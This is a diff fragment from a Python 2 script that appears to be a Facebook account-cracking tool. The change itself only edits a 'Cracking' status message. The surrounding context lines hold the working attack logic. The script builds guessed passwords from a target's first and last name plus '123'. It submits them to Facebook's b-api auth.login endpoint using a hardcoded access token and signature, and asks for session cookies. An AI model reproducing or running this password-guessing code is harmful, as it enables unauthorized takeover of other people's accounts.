@@ -631,7 +631,7 @@ def pilih_super():
         b = json.loads(a.text)
         arp.extend((b['first_name'], b['first_name'].lower(), b['last_name'], b['last_name'].lower()))
         for ckp in arp:
-            sys.stdout.write('\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking ' + user + '\x1b[1;97m' + o)
+            sys.stdout.write('\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking ' + user + '\x1b[1;97m')
             try:
                 pass1 = ckp + '123'
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
